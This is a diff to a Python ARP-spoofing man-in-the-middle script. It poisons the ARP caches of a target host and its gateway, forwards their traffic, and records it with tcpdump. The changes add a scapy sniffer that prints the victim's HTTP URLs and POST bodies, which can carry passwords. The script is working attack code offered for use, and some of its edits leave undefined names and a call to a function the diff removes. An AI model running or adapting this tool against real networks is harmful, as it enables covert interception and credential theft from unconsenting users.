@@ -1,7 +1,8 @@
+      
 #!/usr/bin/python3
-
+import tkinter.messagebox
 import subprocess as sub
-import os, sys, threading, signal
+import os, sys, threading, signal, time, argparse
 
 LOGO = """
 
@@ -20,35 +21,58 @@ $$ |  $$ |$$ |  $$ |$$ |         $$ |
 
 try:
     from scapy.all import *
+    from scapy.layers.http import HTTPRequest
+    import scapy.all as scapy
+
     from getmac import get_mac_address
+    from colorama import Fore, Back, Style
 
 except:
-    print("%s\n[!] Libraries not installed" % LOGO)
-    os.system("echo y | pip3 install getmac && echo y | pip3 install scapy")
+    print(Fore.RED + "%s\n[!] Libraries not installed" % LOGO)
+    os.system("echo y | pip3 install getmac && echo y | pip3 install scapy && echo y | pip3 install scapy_http && echo y | pip3 install colorama")
 
-    print("[!] Restarting..")
+    print(Fore.RED + "[!] Restarting..")
     os.execv(sys.executable, ['python3'] + sys.argv)
 
-def help():
-    print("%s\narpy.py [iface] [target] [gateway] [outfile]\ne.g python3 arpy.py wlp4s0 192.168.1.100 192.168.1.1 out" % LOGO)
-    sys.exit(0)
+def cli():
+    os.system("clear")
+    print(Fore.GREEN + LOGO +"\n"+"Use the following format; [iface] [target1] [target2] [outfile]"+"\n")
+    wd = subprocess.check_output(["pwd"])
 
-def sniffing(outfile, targip):
+    while True:
+        try:
+            cmd = input((wd[:-1].decode())+"$ ")
+            argv = cmd.split()
+        
+            if len(argv) == 4:
+                try: main(argv[0], argv[1], argv[2], argv[3])
+                except Exception as err: 
+                    print(Fore.RED + "[!] "+str(err))
+                    exit()
+                
+                exit()
+
+        except Exception as err: print(Fore.RED + "[!] ", str(err))
+        except KeyboardInterrupt: exit()
+
+def mk_pcap(outfile, targip):
     xterm_sniff = sub.Popen(('sudo', 'tcpdump', 'ip', 'host', targip, '-w', outfile), stdout=sub.PIPE)
-    print("[+] Capturing packets on thread %s" % str(threading.get_ident()))
+    print(Fore.GREEN + "[+] Capturing packets on thread %s" % str(threading.get_ident()))
 
 def restore(gateway_ip, gateway_mac, target_ip, target_mac):
     # resetting arp cache of gateway and target machine
     # by sending arp packets to the broadcast addr (ff:ff:ff:ff:ff:ff)
-    
-    print("[!] Restoring gateway and target hwaddr...")
+    try:
+        print(Fore.RED + "[!] Restoring gateway and target hwaddr...")
+        send(ARP(op=2, psrc = gateway_ip, pdst = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 5)
+        send(ARP(op=2, psrc = target_ip, pdst = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 5)
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
-    send(ARP(op=2, psrc = gateway_ip, pdst = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 5)
-    send(ARP(op=2, psrc = target_ip, pdst = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 5)
-    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        exit()
     
-    try: os.kill()
-    except Exception as err: print("[?] ERR: %s" % err)
+    except Exception as err:
+        print(Fore.RED + "[!] Error, " + str(err))
+        exit()
 
 def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, interface):
     # forward ipv4 traffic
@@ -70,7 +94,7 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, interface):
     poison_gateway.pdst = gateway_ip
     poison_gateway.hwdst = gateway_mac
 
-    print("[+] Starting ARP poisoning on %s (CTRL+C to stop)" % interface)
+    print(Fore.GREEN + "[+] Starting ARP poisoning on %s (CTRL+C to stop)" % interface)
     
     while True:
         try:
@@ -80,46 +104,81 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, interface):
             time.sleep(0.5)
             
         except KeyboardInterrupt: 
-            print("[!] KeyboardInterrupt exception")
+            print(Fore.RED + "[!] KeyboardInterrupt exception")
             restore(gateway_ip, gateway_mac, target_ip, target_mac)
 
-    print("[!] ARP poisoning terminated")
+    print(Fore.RED + "[!] ARP poisoning terminated")
     sys.exit(0)
+
+def xterm_packetviewer(targip):
+    xterm_sniff = sub.Popen(('xterm', '-hold', '-e', 'sudo', 'tcpdump', 'ip', 'host', targip, '-vv', '-A'), stdout=sub.PIPE)
+
+    try: 
+        for packet in iter(xterm_sniff.stdout.readline, b''): print(packet.rstrip())  # iter() to make an iteration
+
+    except KeyboardInterrupt:
+        restore(gatewy, gatewy_mac, targip, target_mac)
+        time.sleep(2)
+        sys.exit(0)
     
+def proc_traffic(packet):
+    # checks if individual packet is HTTP Request
+
+    if packet.haslayer(HTTPRequest):
+
+        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
+        ip = packet[IP].src
+        method = packet[HTTPRequest].Method.decode()
+
+        print("[?] Requested URL: " + str(url))
+        if packet.haslayer(Raw) and method == "POST": print((packet[Raw].load).decode())
+
+def tcpdump_traffic(gatewy, gatewy_mac, targip, target_mac):
+    tcpdump_xterm = sub.Popen(('xterm', '-hold', '-e', 'sudo', 'tcpdump', 'ip', 'host', targip, '-vv', '-A'), stdout = subprocess.PIPE)
+    
+    try: 
+        for packet in iter(tcpdump_xterm.stdout.readline, b''): print(packet.rstrip())  # iter() to make an iteration
+
+    except KeyboardInterrupt:
+        restore(gatewy, gatewy_mac, targip, target_mac)
+        time.sleep(2)
+        sys.exit(0)
+
 def main(interf, targip, gatewy, outfile):
     # setting interface and disabling verbose
     conf.iface = interf
     conf.verb = 0
-    print("[+] Setting up %s " % interf)
+    print(Fore.GREEN + "[+] Setting up %s " % interf)
 
     # gathering mac addr
     gatewy_mac = get_mac_address(ip=gatewy)
     target_mac = get_mac_address(ip=targip)
 
     if gatewy_mac == '00:00:00:00:00:00' or target_mac == '00:00:00:00:00:00':
-        print("[!] Unable to resolve mac addr, exiting")
+        print(Fore.RED + "[!] Unable to resolve mac addr, exiting")
         sys.exit(0)
 
-    else: print("[+] Gateway = %s && Target = %s" % (gatewy_mac,target_mac))
+    else: print(Fore.GREEN + "[+] Target1 = %s && Target2 = %s" % (target_mac, gatewy_mac))
 
     # starting arp poisoning
     poison_t = threading.Thread(target = poison_target, args = (gatewy, gatewy_mac, targip, target_mac, interf))
+    poison_t.daemon = True
     poison_t.start()
     
-    # beginning sniffing process
-    mk_outfile = threading.Thread(target = sniffing, args = (outfile, targip))
+    # create output file (pcap)
+    mk_outfile = threading.Thread(target = mk_pcap, args = (outfile, targip))
+    mk_outfile.daemon = True
     mk_outfile.start()
+    
+    # tcpdump thread
+    tcpdump_t = threading.Thread(target = tcpdump_traffic, args = (gatewy, gatewy_mac, targip, target_mac))
+    tcpdump_t.start()
 
-    xterm_sniff = sub.Popen(('xterm', '-hold', '-e', 'sudo', 'tcpdump', 'ip', 'host', targip, '-vv', '-A'), stdout=sub.PIPE)
-    try: 
-        for packet in iter(xterm_sniff.stdout.readline, b''): print(packet.rstrip())  # iter() to make an iteration
-
-    except KeyboardInterrupt:
-        restore(gatewy, gatewy_mac, targip, target_mac)
-        sys.exit(0)
+    # analyses traffic, proc_traffic for traffic processing
+    scapy.sniff(iface = interf, store = False, prn = proc_traffic, filter = ("host %s" % targip))
 
 if __name__ == "__main__":
-    # e.g sudo python3 arpy.py wlp4s0 192.168.1.179 192.168.1.1 out
+    # e.g sudo python3 arpy.py wlp4s0 192.168.1.10 192.168.1.1 out
     try:
         interface = sys.argv[1]
         if interface.lower() == "help" or interface.lower() == "--help" or interface.lower() == "-help": help()
@@ -129,8 +188,8 @@ if __name__ == "__main__":
 
         ls_dir = subprocess.check_output(['ls'])
 
-        if output_fl in str(ls_dir): print("[!] Output file already exists")
+        if output_fl in str(ls_dir): print(Fore.RED + "[!] Output file already exists")
         else: main(interface, target_ip, gatewy_ip, output_fl)
     
-    except Exception as err: print(err)
-     
+    except Exception as err: cli()
+  
